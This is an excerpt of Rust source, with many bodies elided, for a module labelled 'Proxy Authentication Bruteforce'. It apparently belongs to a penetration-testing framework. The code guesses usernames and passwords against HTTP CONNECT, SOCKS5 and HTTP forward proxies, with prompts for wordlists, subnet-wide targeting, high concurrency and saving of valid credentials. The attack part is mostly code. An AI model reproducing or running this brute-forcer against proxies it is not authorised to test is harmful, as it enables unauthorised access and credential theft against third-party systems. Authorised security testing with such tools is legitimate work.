...
async fn try_http_connect_auth(
    ...
    if let Err(e) = tokio::time::timeout(dur, stream.write_all(req.as_bytes())).await {
        return LoginResult::Error {
            message: format!("Write timeout: {}", e),
            retryable: true,
        };
    }
    ...
    let n = match tokio::time::timeout(dur, stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => n,
        Ok(Ok(n)) => {
            tracing::trace!("proxy read returned {n} bytes (empty)");
            return LoginResult::Error {
    ...
    match http_status_code(&resp) {
        ...
        Some(c) => LoginResult::Error {
            message: format!("HTTP {c}"),
            retryable: false,
        },
        None => {
            let first_line = match resp.lines().next() {
                Some(l) => l.to_string(),
                None => "<empty response>".to_string(),
            };
            LoginResult::Error {
                message: format!("non-HTTP response: {}", first_line),
                retryable: false,
            }
        }
    }
...
fn http_status_code(resp: &str) -> Option<u16> {
    ...
    first
        .split_whitespace()
        .nth(1)
        .and_then(|tok| match tok.parse::<u16>() {
            Ok(c) => Some(c),
            Err(e) => {
                tracing::trace!("non-numeric HTTP status token '{}': {e}", tok);
                None
            }
        })
}
...
async fn try_socks5_auth(
    ...
    match tokio::time::timeout(dur, stream.write_all(&[0x05, 0x01, 0x02])).await {
        ...
        Ok(Err(e)) => {
            ...
            return LoginResult::Error {
                message: "Greeting write failed".to_string(),
                retryable: true,
            };
        }
        Err(e) => {
            ...
            return LoginResult::Error {
                message: "Greeting timeout".to_string(),
                retryable: true,
            };
        }
    }
    ...
    match tokio::time::timeout(dur, stream.read_exact(&mut buf)).await {
        Ok(Ok(n)) => {
            tracing::trace!("SOCKS5 greeting read_exact returned {n} bytes");
        }
        _ => {
            return LoginResult::Error {
                message: "Greeting response timeout".to_string(),
                retryable: true,
            };
        }
    }
    ...
    if buf[0] != 0x05 {
        return LoginResult::Error {
            message: "Not SOCKS5".to_string(),
            retryable: false,
        };
    }
    if buf[1] != 0x02 {
        return LoginResult::Error {
            message: format!("Auth method {} not user/pass", buf[1]),
            retryable: false,
        };
    }
    ...
    if user_bytes.len() > 255 || pass_bytes.len() > 255 {
        return LoginResult::Error {
            message: "Credentials too long (max 255 bytes each)".to_string(),
            retryable: false,
        };
    }
    ...
    match tokio::time::timeout(dur, stream.write_all(&auth_pkt)).await {
        ...
        Ok(Err(e)) => {
            ...
            return LoginResult::Error {
                message: "Auth write failed".to_string(),
                retryable: true,
            };
        }
        Err(e) => {
            ...
            return LoginResult::Error {
                message: "Auth write timeout".to_string(),
                retryable: true,
            };
        }
    }
    ...
    match tokio::time::timeout(dur, stream.read_exact(&mut resp)).await {
        Ok(Ok(n)) => {
            tracing::trace!("SOCKS5 auth read_exact returned {n} bytes");
        }
        _ => {
            return LoginResult::Error {
...
async fn try_http_forward_auth(
    ...
    if matches!(code, Some(c) if (200..=299).contains(&c)) && resp.contains("origin") {
        ...
        LoginResult::Error {
            message: format!("HTTP {}", first_line),
            retryable: false,
        }
    }
}
...
fn display_banner() {
    ...
    crate::mprintln!(
        "{}",
        "|           Proxy Authentication Bruteforce                       |".cyan()
    );
    crate::mprintln!(
        "{}",
        "|   HTTP CONNECT (Basic) | SOCKS5 (RFC 1929) | HTTP Forward      |".cyan()
    );
    crate::mprintln!(
        "{}",
        "+=================================================================+".cyan()
...
pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    ...
    if is_subnet_target(target) {
        let proxy_type_input = cfg_prompt_default(
            "proxy_type",
            "Proxy type (http_connect/socks5/http_forward)",
            "http_connect",
        )
        .await?;
        ...
        let port = cfg_prompt_port(
            "port",
            &format!("{} port", proxy_type.name()),
            proxy_type.default_port(),
        )
        .await?;
        ...
        if users.is_empty() {
            return Err(anyhow!("Username list empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Password list empty"));
        }
        let concurrency =
            cfg_prompt_int_range("concurrency", "Concurrent hosts", 50, 1, 500).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;
        let output_file =
            cfg_prompt_output_file("output_file", "Output file", "proxy_brute_subnet.txt").await?;
    ...
    let concurrency =
        cfg_prompt_int_range("concurrency", "Concurrent attempts", 10, 1, 100).await? as usize;
    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first valid credential?", true).await?;
    let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;
    let save_path =
        cfg_prompt_output_file("output_file", "Output file", "proxy_brute_results.txt").await?;
    let timeout_str = cfg_prompt_default("timeout", "Timeout (ms)", "5000").await?;
    let timeout_ms: u64 = timeout_str
        .trim()
        .parse()
        .with_context(|| format!("invalid timeout '{}' (expected milliseconds)", timeout_str))?;

    crate::mprintln!(
        "[*] Proxy: {} on {}:{}",
        proxy_type.name().cyan(),
        normalized,
        port
    );
